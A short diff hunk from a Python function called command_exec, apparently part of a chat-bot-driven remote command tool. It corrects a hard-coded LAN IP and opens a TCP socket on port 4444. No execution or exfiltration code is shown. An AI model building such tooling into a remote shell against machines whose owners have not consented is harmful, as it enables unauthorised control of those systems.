@@ -120,7 +120,7 @@ def command_exec(m):
     cid = m.chat.id
     puerto = 4444
     #ip1 = "127.0.0.1"
-    ip1 = "191.168.1.114"
+    ip1 = "192.168.1.114"
     ip2 = "192.168.1.103"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
